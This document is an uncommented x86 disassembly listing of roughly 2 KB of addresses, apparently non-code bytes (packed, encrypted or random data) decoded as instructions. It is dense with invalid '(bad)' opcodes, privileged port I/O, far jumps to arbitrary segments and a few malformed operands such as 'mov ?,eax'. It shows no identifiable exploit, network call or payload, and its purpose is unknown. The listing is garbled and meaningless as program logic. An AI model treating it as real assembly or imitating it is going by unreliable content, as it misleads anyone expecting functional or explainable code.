  40dc6f:	dec    edx
  40dc70:	pop    esp
  40dc71:	mul    DWORD PTR [ebx+0x6c49cea5]
  40dc77:	dec    ecx
  40dc78:	push   ss
  40dc79:	and    bl,ch
  40dc7b:	cmp    ebx,DWORD PTR ds:0xf9144836
  40dc81:	imul   ecx,DWORD PTR [eax],0x4165519d
  40dc87:	aaa    
  40dc88:	jae    0x40dcf4
  40dc8a:	cli    
  40dc8b:	xor    DWORD PTR [ebx-0x71],edx
  40dc8e:	mov    BYTE PTR [esp+esi*2],bh
  40dc91:	xchg   BYTE PTR [ebx+0x3],bh
  40dc94:	dec    DWORD PTR [eax]
  40dc96:	add    bh,BYTE PTR [edx+ecx*2]
  40dc99:	pop    eax
  40dc9a:	mov    dh,0x84
  40dc9c:	dec    eax
  40dc9d:	ret    0x3f86
  40dca0:	lods   al,BYTE PTR ds:[esi]
  40dca1:	(bad)  
  40dca2:	or     cl,BYTE PTR [eax+0x10]
  40dca5:	cmp    DWORD PTR [edi-0x4feecbf6],0x2c
  40dcac:	shl    BYTE PTR [ecx+eiz*1-0x5d],cl
  40dcb0:	jmp    0x40dc8f
  40dcb2:	out    0xb1,eax
  40dcb4:	sar    cl,0xf
  40dcb7:	sub    eax,0xe41bc5b1
  40dcbc:	int3   
  40dcbd:	out    dx,eax
  40dcbe:	bound  ecx,QWORD PTR [ebx+0x2d]
  40dcc1:	sbb    al,0x1f
  40dcc3:	mov    edi,ebx
  40dcc5:	push   ecx
  40dcc6:	repz cmp BYTE PTR [ebp-0x23],al
  40dcca:	inc    ebx
  40dccb:	adc    eax,0x8ef680bd
  40dcd0:	fs xchg edi,eax
  40dcd2:	retf   0x4fda
  40dcd5:	hlt    
  40dcd6:	add    bl,BYTE PTR [ebx+0x5e]
  40dcd9:	add    ebx,DWORD PTR ds:0x1d3e6ded
  40dcdf:	mov    ch,0x7f
  40dce1:	dec    ebp
  40dce2:	pusha  
  40dce3:	test   eax,eax
  40dce5:	mov    dh,0xf6
  40dce7:	(bad)  
  40dce8:	fst    DWORD PTR [ecx-0x35]
  40dceb:	cdq    
  40dcec:	mov    ch,0xb3
  40dcee:	and    BYTE PTR [ebx-0x58],cl
  40dcf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcf2:	fiadd  WORD PTR [esi+0x7a]
  40dcf5:	sub    al,0xd8
  40dcf7:	in     al,dx
  40dcf8:	or     cl,BYTE PTR [edi+0x2f519dd2]
  40dcfe:	xchg   BYTE PTR gs:[esi],bl
  40dd01:	cmp    ecx,esi
  40dd03:	adc    DWORD PTR [ecx],0x1fbe577a
  40dd09:	dec    ecx
  40dd0a:	mov    bh,0x69
  40dd0c:	or     DWORD PTR [edi+0x1],ebx
  40dd0f:	in     al,0xdc
  40dd11:	xchg   edx,eax
  40dd12:	jmp    0x40dcbc
  40dd14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd15:	data16 aaa 
  40dd17:	mov    ebx,0xd249eea4
  40dd1c:	scas   al,BYTE PTR es:[edi]
  40dd1d:	fmul   DWORD PTR [edx+0xb]
  40dd20:	push   eax
  40dd21:	fld    QWORD PTR [eax-0x79]
  40dd24:	out    0x8f,eax
  40dd26:	ds mov edi,edx
  40dd29:	jecxz  0x40dd36
  40dd2b:	stos   DWORD PTR es:[edi],eax
  40dd2c:	fcom   DWORD PTR [eax+0xf]
  40dd2f:	ins    BYTE PTR es:[edi],dx
  40dd30:	leave  
  40dd31:	adc    bl,bl
  40dd33:	iret   
  40dd34:	pop    esi
  40dd35:	adc    ch,BYTE PTR [eax+0x3dd60f9a]
  40dd3b:	mov    ebx,DWORD PTR [eax-0x5d]
  40dd3e:	in     al,0xd7
  40dd40:	and    bl,BYTE PTR [esi+edi*8+0x48]
  40dd44:	add    edi,0x1f
  40dd47:	jne    0x40dd19
  40dd49:	nop
  40dd4a:	scas   eax,DWORD PTR es:[edi]
  40dd4b:	clc    
  40dd4c:	stos   DWORD PTR es:[edi],eax
  40dd4d:	dec    ebp
  40dd4e:	hlt    
  40dd4f:	sub    bl,BYTE PTR [ebp+0x44]
  40dd52:	ja     0x40dd71
  40dd54:	jmp    0x1ada:0xf215dd64
  40dd5b:	pop    ebp
  40dd5c:	scas   al,BYTE PTR es:[edi]
  40dd5d:	pop    edx
  40dd5e:	xchg   ecx,eax
  40dd5f:	inc    edx
  40dd60:	sbb    BYTE PTR [ebx],ch
  40dd62:	repnz addr16 dec ebp
  40dd65:	or     ecx,DWORD PTR [ebx+esi*8-0x7e]
  40dd69:	(bad)  
  40dd6a:	pop    ds
  40dd6b:	test   al,0x63
  40dd6d:	adc    ah,BYTE PTR [edx-0x416e6774]
  40dd73:	sbb    edi,ebp
  40dd75:	mov    esi,0x104ed342
  40dd7a:	loop   0x40dd93
  40dd7c:	in     eax,0x94
  40dd7e:	in     al,dx
  40dd7f:	mov    dl,0x2f
  40dd81:	popf   
  40dd82:	bound  ebp,QWORD PTR [esi-0x33a9f013]
  40dd88:	push   es
  40dd89:	stos   DWORD PTR es:[edi],eax
  40dd8a:	mov    ebx,0x1956aba
  40dd8f:	add    al,0x39
  40dd91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd92:	push   edi
  40dd93:	iret   
  40dd94:	rol    ah,cl
  40dd96:	daa    
  40dd97:	lods   eax,DWORD PTR ds:[esi]
  40dd98:	add    al,0xda
  40dd9a:	sahf   
  40dd9b:	push   edi
  40dd9c:	outs   dx,BYTE PTR ds:[esi]
  40dd9d:	jg     0x40ddb6
  40dd9f:	or     DWORD PTR ds:0x43c37e04,esp
  40dda5:	loop   0x40ddba
  40dda7:	test   al,0x9a
  40dda9:	ins    BYTE PTR es:[edi],dx
  40ddaa:	rcl    DWORD PTR [edi-0x19494c40],0xa9
  40ddb1:	xor    ah,BYTE PTR [eax-0x5]
  40ddb4:	mov    BYTE PTR [ecx-0x4b65bb30],al
  40ddba:	pop    ss
  40ddbb:	in     al,dx
  40ddbc:	es mov esp,0xdac5d423
  40ddc2:	scas   al,BYTE PTR es:[edi]
  40ddc3:	shr    DWORD PTR [edi-0x52dde982],cl
  40ddc9:	(bad)  [ebp-0xca9ae5]
  40ddcf:	pop    esp
  40ddd0:	out    0x10,eax
  40ddd2:	data16 out 0xa6,al
  40ddd5:	sar    DWORD PTR [ebp+0x6c206ca4],1
  40dddb:	div    BYTE PTR [ebx]
  40dddd:	scas   eax,DWORD PTR es:[edi]
  40ddde:	adc    al,0x6
  40dde0:	jae    0x40ddea
  40dde2:	scas   al,BYTE PTR es:[edi]
  40dde3:	mov    ecx,DWORD PTR [ebp+0x66]
  40dde6:	add    BYTE PTR [ebx],dl
  40dde8:	pop    ebp
  40dde9:	cmc    
  40ddea:	out    dx,al
  40ddeb:	int3   
  40ddec:	adc    edi,DWORD PTR [edx]
  40ddee:	cs dec edx
  40ddf0:	pop    ecx
  40ddf1:	(bad)  
  40ddf2:	clc    
  40ddf3:	and    dh,dl
  40ddf5:	mov    BYTE PTR [ecx-0x36edfc2d],cl
  40ddfb:	xor    al,dh
  40ddfd:	push   ss
  40ddfe:	adc    BYTE PTR [ebp+0x42],bh
  40de01:	xor    al,0x3c
  40de03:	xor    cl,BYTE PTR [edx-0x6b]
  40de06:	pop    ecx
  40de07:	mov    ds:0x3fc10e0e,eax
  40de0c:	rol    esp,1
  40de0e:	pop    esi
  40de0f:	rcr    BYTE PTR [edi-0x15],0x1f
  40de13:	or     al,0xe6
  40de15:	cwde   
  40de16:	cmp    DWORD PTR [eax+0x416b1f62],ecx
  40de1c:	xchg   esi,eax
  40de1d:	mov    esi,0x5f76af7c
  40de22:	add    eax,0x5fe57424
  40de27:	(bad)  
  40de28:	ror    eax,1
  40de2a:	or     DWORD PTR [esi+esi*8],esp
  40de2d:	enter  0x546d,0x55
  40de31:	xor    dl,ah
  40de33:	outs   dx,DWORD PTR ds:[esi]
  40de34:	or     DWORD PTR [ebx+edi*2-0x453e7254],ecx
  40de3b:	xor    al,0xa
  40de3d:	jo     0x40ddec
  40de3f:	cmp    sp,0xb25f
  40de44:	sti    
  40de45:	sbb    al,BYTE PTR [edi+ebx*2-0x11]
  40de49:	shr    DWORD PTR [edx+eiz*4+0x5e],1
  40de4d:	xchg   edi,eax
  40de4e:	sub    al,0x5b
  40de50:	push   es
  40de51:	push   cs
  40de52:	mov    al,ds:0xe3cdde52
  40de57:	aas    
  40de58:	aas    
  40de59:	ss xor eax,0x8a086968
  40de5f:	xor    eax,0x31886a25
  40de64:	fnstenv [eax+0x13]
  40de67:	and    al,0xbc
  40de69:	jae    0x40dee9
  40de6b:	je     0x40de19
  40de6d:	add    eax,0xbbd7fcd3
  40de72:	sub    DWORD PTR ds:0xdf539b4e,esi
  40de78:	rol    eax,cl
  40de7a:	out    dx,eax
  40de7b:	int3   
  40de7c:	int    0xde
  40de7e:	and    eax,0x49a64e42
  40de83:	dec    esi
  40de84:	mov    bh,0xac
  40de86:	pop    ss
  40de87:	push   ds
  40de88:	jl     0x40dec2
  40de8a:	jecxz  0x40de45
  40de8c:	cmp    ecx,DWORD PTR [ecx+edi*2+0x77b9e6f3]
  40de93:	out    0x5f,eax
  40de95:	dec    ecx
  40de96:	cmp    eax,0x64bd47cd
  40de9b:	inc    edx
  40de9c:	lds    esp,FWORD PTR [edx-0x4eb495c7]
  40dea2:	icebp  
  40dea3:	adc    al,0x4d
  40dea5:	add    cl,BYTE PTR [edi-0x170729f9]
  40deab:	xchg   edi,eax
  40deac:	cmp    dh,BYTE PTR [eax]
  40deae:	jno    0x40de66
  40deb0:	daa    
  40deb1:	sub    eax,DWORD PTR [ebp+0x28]
  40deb4:	mov    ecx,DWORD PTR [ecx+0x6b]
  40deb7:	inc    esi
  40deb8:	das    
  40deb9:	jg     0x40de79
  40debb:	push   0x1ec110c2
  40dec0:	adc    eax,0x624734b3
  40dec5:	add    DWORD PTR [esi-0x6a],ebx
  40dec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dec9:	(bad)  
  40deca:	push   ebx
  40decb:	(bad)  
  40decc:	jne    0x40def8
  40dece:	sar    DWORD PTR ss:0x4b168aba,0xb7
  40ded6:	xchg   DWORD PTR [ebp+0x4c],eax
  40ded9:	ffree  st(4)
  40dedb:	(bad)  
  40dedc:	cmp    eax,DWORD PTR [ebx+0x27518ee6]
  40dee2:	das    
  40dee3:	loop   0x40de6a
  40dee5:	lahf   
  40dee6:	and    eax,0xa68e638e
  40deeb:	fwait
  40deec:	sbb    eax,0x3d5159a0
  40def1:	pop    edi
  40def2:	adc    ch,dh
  40def4:	mov    esi,0x84a0320a
  40def9:	test   bl,bh
  40defb:	ja     0x40deba
  40defd:	xor    eax,0xd950a35a
  40df02:	push   0xfffffff2
  40df04:	enter  0xd17d,0xf3
  40df08:	imul   BYTE PTR [ebp+0x36]
  40df0b:	sub    ebx,ebp
  40df0d:	mov    ebx,0x38060447
  40df12:	xchg   edx,eax
  40df13:	adc    eax,0x4e430a1a
  40df18:	lock mov eax,0x78737721
  40df1e:	xchg   esi,eax
  40df1f:	cmp    BYTE PTR [ebp+0x3a],dh
  40df22:	leave  
  40df23:	sub    DWORD PTR [eax+0x1a],0x19
  40df27:	mov    ch,0x93
  40df29:	pop    ebp
  40df2a:	add    eax,DWORD PTR [esi+0x4c]
  40df2d:	cmp    eax,0xb415961a
  40df32:	dec    esi
  40df33:	test   BYTE PTR [ebp-0x18],dl
  40df36:	fisttp DWORD PTR [ebx+eiz*1+0x6321351a]
  40df3d:	inc    esi
  40df3e:	adc    eax,0x68354e6a
  40df43:	xor    DWORD PTR [eax-0x5c],esi
  40df46:	lods   al,BYTE PTR ds:[esi]
  40df47:	dec    ecx
  40df48:	adc    bl,BYTE PTR [eax]
  40df4a:	(bad)  
  40df4b:	fwait
  40df4c:	idiv   BYTE PTR ds:0xa21ac427
  40df52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df53:	adc    al,0x1e
  40df55:	clc    
  40df56:	dec    esi
  40df57:	jne    0x40def2
  40df59:	ret    
  40df5a:	das    
  40df5b:	add    eax,0x36f69d14
  40df60:	(bad)  
  40df61:	mov    edi,0x5d9cf1bb
  40df66:	enter  0x7905,0xb9
  40df6a:	lea    ecx,[edi-0x4df84c3b]
  40df70:	sub    al,0x86
  40df72:	add    eax,0x1b108c19
  40df77:	lahf   
  40df78:	mov    edx,0x4ddba270
  40df7d:	lahf   
  40df7e:	retf   
  40df7f:	sbb    esi,DWORD PTR ds:0xd0726fdf
  40df85:	cwde   
  40df86:	sbb    al,0xdf
  40df88:	repnz in al,0x53
  40df8b:	popf   
  40df8c:	stc    
  40df8d:	jae    0x40e003
  40df8f:	aaa    
  40df90:	or     BYTE PTR [edx],cl
  40df92:	xor    eax,0x1a99c2ae
  40df97:	in     eax,dx
  40df98:	xchg   edx,eax
  40df99:	pop    ebp
  40df9a:	and    al,0x4f
  40df9c:	or     ebx,ebp
  40df9e:	jp     0x40df98
  40dfa0:	ins    DWORD PTR es:[edi],dx
  40dfa1:	jbe    0x40dfe6
  40dfa3:	(bad)  
  40dfa4:	xchg   esi,eax
  40dfa5:	inc    ecx
  40dfa6:	inc    edi
  40dfa7:	scas   al,BYTE PTR es:[edi]
  40dfa8:	hlt    
  40dfa9:	xchg   BYTE PTR [esi+eiz*1+0x71],ah
  40dfad:	in     eax,0xc1
  40dfaf:	inc    ecx
  40dfb0:	sbb    BYTE PTR [edx-0x2dfeea],dl
  40dfb6:	inc    esp
  40dfb7:	mov    ds:0xe853d79d,eax
  40dfbc:	jl     0x40dfcc
  40dfbe:	mov    eax,ds:0x28fc3b3
  40dfc3:	adc    ecx,esi
  40dfc5:	popf   
  40dfc6:	iret   
  40dfc7:	mov    ss,WORD PTR [ebp+0x6bbb4751]
  40dfcd:	iret   
  40dfce:	or     ch,BYTE PTR [ebx+0x49f866da]
  40dfd4:	sub    ecx,DWORD PTR [ebp+0xee5c06f]
  40dfda:	mov    esp,0xc829d2e7
  40dfdf:	add    BYTE PTR fs:[edx+0xd878e0b],0xce
  40dfe7:	push   esi
  40dfe8:	sbb    al,0xb0
  40dfea:	dec    edx
  40dfeb:	iret   
  40dfec:	arpl   WORD PTR [eax-0x25],sp
  40dfef:	data16 cs (bad) 
  40dff2:	sub    eax,0xa430d58a
  40dff7:	aad    0xb0
  40dff9:	mov    eax,ds:0xdba57cd3
  40dffe:	dec    ecx
  40dfff:	iret   
  40e000:	(bad)  
  40e001:	xchg   esi,eax
  40e002:	adc    BYTE PTR [esi],al
  40e004:	dec    edx
  40e005:	push   ecx
  40e006:	push   esp
  40e007:	mov    al,ds:0x34186d1
  40e00c:	sbb    ch,BYTE PTR [ebx+0x1a94599d]
  40e012:	adc    DWORD PTR [ecx+ebx*1-0x62],0x510c1826
  40e01a:	mov    cl,0x84
  40e01c:	je     0x40dfe3
  40e01e:	jo     0x40dfc1
  40e020:	xchg   DWORD PTR [ebx-0x69fec069],ebx
  40e026:	pop    ecx
  40e027:	push   es
  40e028:	scas   eax,DWORD PTR es:[edi]
  40e029:	cld    
  40e02a:	push   cs
  40e02b:	(bad)  
  40e02c:	hlt    
  40e02d:	push   esi
  40e02e:	nop
  40e02f:	scas   al,BYTE PTR es:[edi]
  40e030:	dec    ecx
  40e031:	in     al,0xaf
  40e033:	hlt    
  40e034:	pop    ds
  40e035:	stc    
  40e036:	jno    0x40e08b
  40e038:	push   0x1e
  40e03a:	cld    
  40e03b:	fadd   QWORD PTR [edi-0x27]
  40e03e:	push   esp
  40e03f:	xor    BYTE PTR [edx+edx*4-0x53],ah
  40e043:	inc    esi
  40e044:	pop    es
  40e045:	arpl   WORD PTR [edx-0x53],si
  40e048:	push   ds
  40e049:	xor    bl,BYTE PTR [eax+eax*2+0x35]
  40e04d:	jmp    0xcc0f:0xd2e03092
  40e054:	fbstp  TBYTE PTR [edx+0x2a7c2f35]
  40e05a:	and    al,0x12
  40e05c:	aas    
  40e05d:	xor    ecx,ecx
  40e05f:	xor    eax,0xb1b583b5
  40e064:	bound  ecx,QWORD PTR [edx+0x1]
  40e067:	rcl    ebp,0xc
  40e06a:	fldpi  
  40e06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e06d:	push   ecx
  40e06e:	mov    edi,0xba0f6b26
  40e073:	ja     0x40e0bb
  40e075:	xchg   ebx,eax
  40e076:	mov    ebp,0x6d4d0a18
  40e07b:	repz mov esp,0xf0177dc0
  40e081:	xchg   DWORD PTR [eax+0x66],edx
  40e084:	ror    dl,1
  40e086:	enter  0x9c8,0x2
  40e08a:	dec    edi
  40e08b:	imul   esi,DWORD PTR [ecx-0x5629cad1],0xffffff98
  40e092:	jnp    0x40e0f7
  40e094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e095:	fmulp  st(7),st
  40e097:	lock leave 
  40e099:	mov    ebp,0xada678f4
  40e09e:	les    edx,FWORD PTR ds:0x86d4d812
  40e0a4:	mov    ebp,DWORD PTR [ebx-0x6e70ce79]
  40e0aa:	or     eax,0x8749ba36
  40e0af:	mov    esp,0x82fd82fe
  40e0b4:	or     DWORD PTR [ecx+esi*4],ebp
  40e0b7:	popf   
  40e0b8:	lock mov bh,ch
  40e0bb:	ins    BYTE PTR es:[edi],dx
  40e0bc:	out    0x53,al
  40e0be:	outs   dx,BYTE PTR ds:[esi]
  40e0bf:	adc    eax,0xe2d42bb6
  40e0c4:	pop    ebp
  40e0c5:	mov    dl,0x6a
  40e0c7:	stc    
  40e0c8:	jge    0x40e04a
  40e0ca:	test   al,0x83
  40e0cc:	cmp    al,0xa2
  40e0ce:	(bad)  
  40e0cf:	sbb    al,0xf1
  40e0d1:	lods   eax,DWORD PTR ds:[esi]
  40e0d2:	xor    esi,DWORD PTR [eax+0xb]
  40e0d5:	push   ebp
  40e0d6:	ss in  eax,dx
  40e0d8:	jns    0x40e152
  40e0da:	lods   eax,DWORD PTR ds:[esi]
  40e0db:	sbb    edi,edx
  40e0dd:	repz in eax,0xc9
  40e0e0:	pop    esp
  40e0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0e2:	xchg   edx,eax
  40e0e3:	sub    al,0x7
  40e0e5:	sub    DWORD PTR [ebx+0x23],0x4b
  40e0e9:	push   ebx
  40e0ea:	fst    QWORD PTR [ebx]
  40e0ec:	mov    ds:0xe4283e48,al
  40e0f1:	xchg   ebx,eax
  40e0f2:	or     edi,eax
  40e0f4:	sbb    ah,BYTE PTR [esi+0x25]
  40e0f7:	and    ecx,DWORD PTR [ebp-0x6970321e]
  40e0fd:	cmp    edi,DWORD PTR [eax-0xe]
  40e100:	rcl    BYTE PTR ds:0xc43222eb,1
  40e106:	sub    al,0xb7
  40e108:	enter  0xd08a,0xda
  40e10c:	out    dx,eax
  40e10d:	mov    edi,DWORD PTR [edi+0x55]
  40e110:	sub    al,0x47
  40e112:	mov    dh,0x9d
  40e114:	xor    eax,0x84cff4b6
  40e119:	inc    BYTE PTR [ecx]
  40e11b:	xchg   edx,eax
  40e11c:	sub    al,0xbe
  40e11e:	sbb    BYTE PTR [edi],al
  40e120:	jbe    0x40e135
  40e122:	aas    
  40e123:	adc    DWORD PTR [esi+0x3cc0640e],0x6e87f599
  40e12d:	mul    ebx
  40e12f:	dec    ebx
  40e130:	pop    ebx
  40e131:	(bad)  
  40e132:	mov    ecx,0x7b70da15
  40e137:	ror    BYTE PTR [ebx-0x55991a62],cl
  40e13d:	cmp    eax,0xd9959298
  40e142:	in     eax,0xd9
  40e144:	pop    es
  40e145:	leave  
  40e146:	sti    
  40e147:	imul   ecx,DWORD PTR [edx-0x3],0x63
  40e14b:	sbb    DWORD PTR [edx+0x165cf8b9],0x5abb2ea6
  40e155:	imul   edi,DWORD PTR [edi],0x4fce60af
  40e15b:	sbb    BYTE PTR [ecx+0x5cc419a2],0x67
  40e162:	mov    dl,0xf0
  40e164:	scas   al,BYTE PTR es:[edi]
  40e165:	pop    esp
  40e166:	xchg   ebx,eax
  40e167:	out    dx,al
  40e168:	scas   eax,DWORD PTR es:[edi]
  40e169:	push   ebx
  40e16a:	jg     0x40e1c2
  40e16c:	cmp    eax,0x5e74d2d5
  40e171:	daa    
  40e172:	bound  esi,QWORD PTR [ebp+0x49]
  40e175:	test   eax,0x7b955e8c
  40e17a:	cli    
  40e17b:	xchg   ebp,eax
  40e17c:	push   es
  40e17d:	gs xchg esi,eax
  40e17f:	xor    DWORD PTR [edx+0x4b],eax
  40e182:	mov    al,0xb
  40e184:	jns    0x40e130
  40e186:	pop    ss
  40e187:	sbb    eax,0x6fd2ef63
  40e18c:	cs aad 0x40
  40e18f:	rcr    BYTE PTR [ebx],1
  40e191:	loope  0x40e134
  40e193:	or     ah,dl
  40e195:	outs   dx,BYTE PTR ds:[esi]
  40e196:	sub    ah,BYTE PTR [edi]
  40e198:	jo     0x40e19c
  40e19a:	add    BYTE PTR [esi],dl
  40e19c:	mov    edx,0x68185652
  40e1a1:	mov    ?,eax
  40e1a3:	sub    edi,edx
  40e1a5:	jecxz  0x40e1dc
  40e1a7:	test   BYTE PTR [ebx],al
  40e1a9:	pop    ecx
  40e1aa:	sbb    eax,0x5cbd1f3f
  40e1af:	repz xor ecx,DWORD PTR [ecx+0xa]
  40e1b3:	scas   al,BYTE PTR es:[edi]
  40e1b4:	xchg   ecx,eax
  40e1b5:	les    ebx,FWORD PTR [edi]
  40e1b7:	(bad)  
  40e1b9:	stos   DWORD PTR es:[edi],eax
  40e1ba:	jno    0x40e19a
  40e1bc:	bound  eax,QWORD PTR [esp+edi*1-0x40cc0086]
  40e1c3:	mov    ds:0x24ca47be,eax
  40e1c8:	sti    
  40e1c9:	or     ecx,DWORD PTR [edx]
  40e1cb:	ret    0x5920
  40e1ce:	loope  0x40e1b6
  40e1d0:	xchg   esi,eax
  40e1d1:	push   esp
  40e1d2:	push   esi
  40e1d3:	inc    edi
  40e1d4:	mov    ebp,0xf22671fd
  40e1d9:	test   al,0x17
  40e1db:	out    0xb6,eax
  40e1dd:	int3   
  40e1de:	fcom   DWORD PTR [edx-0x4c3127a3]
  40e1e4:	sub    eax,0x30f07972
  40e1e9:	retf   0x8dd7
  40e1ec:	and    al,0x2a
  40e1ee:	jg     0x40e1cc
  40e1f0:	syscall 
  40e1f2:	xchg   ebx,eax
  40e1f3:	cmp    DWORD PTR [eax+0x2a],ebx
  40e1f6:	add    ebx,edi
  40e1f8:	inc    ebx
  40e1f9:	mov    ch,0x22
  40e1fb:	add    esp,DWORD PTR [eax-0x10aff977]
  40e201:	sub    eax,0xcb50d2e4
  40e206:	jge    0x40e204
  40e208:	aas    
  40e209:	sbb    bh,BYTE PTR [ecx+0x3f6e075c]
  40e20f:	add    eax,0x9967ace
  40e214:	out    0x54,al
  40e216:	add    DWORD PTR [eax-0x5e],0x43
  40e21a:	dec    edi
  40e21b:	jmp    0x40e257
  40e21d:	das    
  40e21e:	aad    0x3f
  40e220:	out    0xcc,eax
  40e222:	outs   dx,BYTE PTR ds:[esi]
  40e223:	cmp    edi,DWORD PTR [edx]
  40e225:	push   ds
  40e226:	mov    al,0x3
  40e228:	scas   eax,DWORD PTR es:[edi]
  40e229:	daa    
  40e22a:	mov    esi,db4
  40e22d:	stos   DWORD PTR es:[edi],eax
  40e22e:	test   eax,0xf47a11ec
  40e233:	push   ds
  40e234:	jl     0x40e1df
  40e236:	leave  
  40e237:	in     eax,0x1f
  40e239:	pop    ecx
  40e23a:	sbb    DWORD PTR [esi+0x97c9526],eax
  40e240:	fisttp QWORD PTR [esi]
  40e242:	in     al,dx
  40e243:	pop    ss
  40e244:	xchg   edi,eax
  40e246:	shr    BYTE PTR [ebp-0x24],cl
  40e249:	cmp    DWORD PTR [edx+0x1ec893cd],0xe93e9793
  40e253:	sub    DWORD PTR [ebx-0x5b],0xffffff94
  40e257:	add    al,0xde
  40e259:	fs addr16 (bad) 
  40e25c:	jb     0x40e2b1
  40e25e:	xchg   ebp,eax
  40e25f:	and    eax,DWORD PTR [esi]
  40e261:	jl     0x40e282
  40e263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e264:	push   es
  40e265:	fisttp DWORD PTR [ebx+esi*1]
  40e268:	pusha  
  40e269:	je     0x40e214
  40e26b:	xchg   BYTE PTR [edx],ah
  40e26d:	push   es
  40e26e:	call   DWORD PTR ds:0xb4803e4d
  40e274:	gs dec edx
  40e276:	cwde   
  40e277:	mov    edi,0xa53715d9
  40e27c:	push   ebx
  40e27d:	and    ch,BYTE PTR [edx-0x2fb6de61]
  40e283:	mov    ebx,0xf92d9d01
  40e288:	ja     0x40e2f2
  40e28a:	inc    ebp
  40e28b:	add    al,0x33
  40e28d:	pop    ds
  40e28e:	es inc edx
  40e290:	rcr    DWORD PTR [eax+0x42c2fcde],1
  40e296:	ficomp WORD PTR ds:[edi+edx*1+0x15f65e50]
  40e29e:	xor    BYTE PTR [eax+ebp*4+0x18],al
  40e2a2:	xor    esi,DWORD PTR [edx+0xb22c7e1]
  40e2a8:	(bad)
  40e2ab:	inc    eax
  40e2ac:	aad    0x92
  40e2ae:	mov    al,0x1b
  40e2b0:	neg    BYTE PTR [edx]
  40e2b2:	mov    al,ds:0x5df820d0
  40e2b7:	add    DWORD PTR [ebx-0x6f837fc6],edx
  40e2bd:	ret    
  40e2be:	push   ecx
  40e2bf:	dec    ecx
  40e2c0:	or     ch,bh
  40e2c2:	push   ebp
  40e2c3:	test   edx,eax
  40e2c5:	leave  
  40e2c6:	fwait
  40e2c7:	mov    esp,0xc1c197d0
  40e2cc:	jmp    0x59fc:0x139d158b
  40e2d3:	xchg   DWORD PTR [ecx+0x6abd0072],ecx
  40e2d9:	xchg   edi,eax
  40e2da:	add    DWORD PTR gs:[edi+0x53ee4155],edx
  40e2e1:	adc    dh,BYTE PTR [edx]
  40e2e3:	(bad)  
  40e2e4:	retf   0x7dc0
  40e2e7:	js     0x40e2d4
  40e2e9:	push   esi
  40e2ea:	retf   
  40e2eb:	adc    BYTE PTR [ecx],cl
  40e2ed:	int3   
  40e2ee:	mov    eax,ds:0xeb6d9c68
  40e2f3:	call   0x170e:0x85dc2d0e
  40e2fa:	sub    ah,BYTE PTR es:[ecx-0x48f2e51d]
  40e301:	sub    ch,dl
  40e303:	int3   
  40e304:	arpl   WORD PTR [eax],cx
  40e306:	in     al,dx
  40e307:	push   esi
  40e308:	xor    eax,0x66d205be
  40e30d:	int3   
  40e30e:	inc    ebp
  40e30f:	sar    edi,0x65
  40e312:	adc    al,0x91
  40e314:	inc    eax
  40e315:	pop    ds
  40e316:	inc    ecx
  40e317:	gs scas al,BYTE PTR es:[edi]
  40e319:	xchg   ecx,eax
  40e31a:	push   ss
  40e31b:	add    DWORD PTR [ebp+0x72b4744d],0x39fccd3b
  40e325:	out    dx,eax
  40e326:	repz sub eax,0x4a7a270a
  40e32c:	je     0x40e2dd
  40e32e:	arpl   WORD PTR [ebp-0x1bda0e65],sp
  40e334:	pop    ebp
  40e335:	mov    bl,0x75
  40e337:	add    bl,BYTE PTR [edx-0x19]
  40e33a:	(bad)  
  40e33b:	js     0x40e38e
  40e33d:	shl    BYTE PTR [ecx+0x39],1
  40e340:	push   0xf
  40e342:	hlt    
  40e343:	pusha  
  40e344:	mov    dh,0x20
  40e346:	test   BYTE PTR [ebp-0x5a1f9e8d],dh
  40e34c:	and    BYTE PTR [edx+0x72],ch
  40e34f:	and    edi,DWORD PTR [ecx]
  40e351:	mov    bl,0x87
  40e353:	mov    ds:0x8e37e3f2,eax
  40e358:	push   ebx
  40e359:	xchg   ebp,eax
  40e35a:	xor    BYTE PTR [edi],bh
  40e35c:	std    
  40e35d:	push   edi
  40e35e:	(bad)  
  40e35f:	push   eax
  40e360:	mov    eax,ds:0x6a8f49b4
  40e365:	enter  0x10ff,0xa6
  40e369:	je     0x40e3cb
  40e36b:	push   ds
  40e36c:	push   ss
  40e36d:	pop    ebp
  40e36e:	inc    ecx
  40e36f:	ins    DWORD PTR es:[edi],dx
  40e370:	xchg   dh,cl
  40e372:	rcr    BYTE PTR [ecx],0xc7
  40e375:	push   esi
  40e376:	es inc ebx
  40e378:	shl    DWORD PTR [ecx+0x5a],1
  40e37b:	sbb    esi,DWORD PTR [ebp-0x6248e0bb]
  40e381:	out    0x55,al
  40e383:	and    eax,0x10b19f21
  40e388:	sahf   
  40e389:	pop    ds
  40e38a:	out    0x7d,al
  40e38c:	mov    bl,0xf4
  40e38e:	jnp    0x40e40e
  40e390:	iret   
  40e391:	in     al,0x3f
  40e393:	pop    ecx
  40e394:	inc    esi
  40e395:	in     eax,dx
  40e396:	lds    esi,FWORD PTR [ecx]
  40e398:	retf   
  40e399:	or     eax,0x64c6cffb
  40e39e:	pushf  
  40e39f:	push   ebp
  40e3a0:	cmp    al,0xdf
  40e3a2:	xchg   ecx,eax
  40e3a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3a4:	popa   
  40e3a5:	fyl2x  
  40e3a7:	scas   eax,DWORD PTR es:[edi]
  40e3a8:	call   0x14e9:0xc4e2f0ad
  40e3af:	mov    ds:0xd382d4e0,eax
  40e3b4:	daa    
  40e3b5:	or     al,0x16
  40e3b7:	xor    BYTE PTR [eax+0x24],cl
  40e3ba:	xor    al,BYTE PTR [esi-0x14c74b78]
  40e3c0:	xchg   esi,eax
  40e3c1:	xchg   BYTE PTR [ebp+0x205a8701],cl
  40e3c7:	or     bl,BYTE PTR [edi]
  40e3c9:	mov    edx,DWORD PTR [edi-0x16]
  40e3cc:	and    bh,al
  40e3ce:	push   0x2d53425b
  40e3d3:	pop    edx
  40e3d4:	loopne 0x40e408
  40e3d6:	outs   dx,BYTE PTR ds:[esi]
